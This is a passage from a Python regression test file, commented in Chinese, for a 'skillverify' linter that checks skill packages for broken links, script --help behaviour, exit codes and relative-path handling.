    report = lint_skill(clean)
    check(report.exit_code() == 0 and report.verdict() == "PASS",
          f"干净技能（无脚本）：exit 0（实得 {report.exit_code()}）")

    broken = tmp / "exit_fail" / "demo-skill"
    (broken / "references").mkdir(parents=True, exist_ok=True)
    (broken / "SKILL.md").write_text(
        skill_md("# Demo\n\nSee `references/missing.md`.\n"), encoding="utf-8", newline="")
    report = lint_skill(broken)
    check(report.exit_code() == 1, f"断链：exit 1（实得 {report.exit_code()}）")

    warn = tmp / "exit_warn" / "demo-skill"
    (warn / "docs").mkdir(parents=True, exist_ok=True)
    (warn / "SKILL.md").write_text(skill_md("# Demo\n"), encoding="utf-8", newline="")
    (warn / "docs/x.md").write_text("# X\n", encoding="utf-8", newline="")
    report = lint_skill(warn)
    check(report.exit_code() == 2, f"仅有 WARN：exit 2（实得 {report.exit_code()}）")


def run_relative_path(tmp: Path) -> None:
    """相对路径调用必须与绝对路径等价（脚本实测的 cwd 陷阱）。

    这个用例来自一次真实缺陷：内部存相对路径 + 子进程 cwd=技能根目录，
    于是"相对技能根的脚本路径"被拼了两次，`--help` 报"找不到文件"，
    表现为"脚本没有 --help"的假 FAIL——而所有测试当时用的都是绝对路径。
    """
    print("[test_relative_path]")
    target = _bare_skill(tmp / "rel", "good", {"scripts/tool.py": GOOD_SCRIPT})
    cwd = Path.cwd()
    try:
        os.chdir(tmp)
        report = lint_skill(Path("rel") / "good" / "demo-skill",
                            run_scripts=True, script_timeout_s=10.0)
    finally:
        os.chdir(cwd)
    check(status_of(report, "SCRIPT-004") == PASS,
          "相对路径调用下脚本实测仍通过（实得 "
          f"{status_of(report, 'SCRIPT-004')}: "
          f"{next((r.evidence for r in report.results if r.rid == 'SCRIPT-004'), '')[:80]}）")


# --------------------------------------------------------------------------- #
# dogfood（可选）
# --------------------------------------------------------------------------- #


def run_dogfood(repo: Path) -> None:
    print("[test_dogfood]")
    legacy = repo / "legacy"
    if not legacy.is_dir():
        ok("无 legacy/ 目录，跳过")
        return
    targets = sorted(p for p in legacy.iterdir()
                     if p.is_dir() and (p / "SKILL.md").is_file())
    for target in targets:
        report = lint_skill(target, run_scripts=True)
        counts = report.counts()
        print(f"  · {target.name}: exit={report.exit_code()} "
              f"PASS={counts[PASS]} WARN={counts[WARN]} FAIL={counts[FAIL]} "
              f"SKIP={counts[SKIP]} INFO={counts[INFO]}")
        for res in report.results:
            if res.status in (FAIL, WARN):
                print(f"      {res.status} {res.rid} {res.evidence[:140]}")
    ok(f"dogfood 完成：{len(targets)} 个旧技能（结论仅供人工分诊，不作断言）")


# --------------------------------------------------------------------------- #


def main() -> int:
    force_utf8_stdio()
    parser = argparse.ArgumentParser(description="skillverify lint 模块回归测试")
    parser.add_argument("--dogfood", action="store_true",
                        help="额外对本仓库 legacy/ 下的技能跑一遍并打印摘要")
    args = parser.parse_args()

    tmp = Path(tempfile.mkdtemp(prefix="sv_test_lint_"))
    try:
        run_case_matrix(tmp)
        run_rule_coverage(tmp)
        run_regressions(tmp)
        run_script_contracts(tmp)
        run_relative_path(tmp)
        run_exit_codes(tmp)
        run_optional_marking(tmp)
        run_ts_script(tmp)
        if args.dogfood:
            run_dogfood(Path(__file__).resolve().parent.parent)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    total = len(_passed) + len(_failed)
    print(f"\n结果: PASS={len(_passed)} FAIL={len(_failed)} 合计={total}")
    return 1 if _failed else 0


if __name__ == "__main__":
    sys.exit(main())
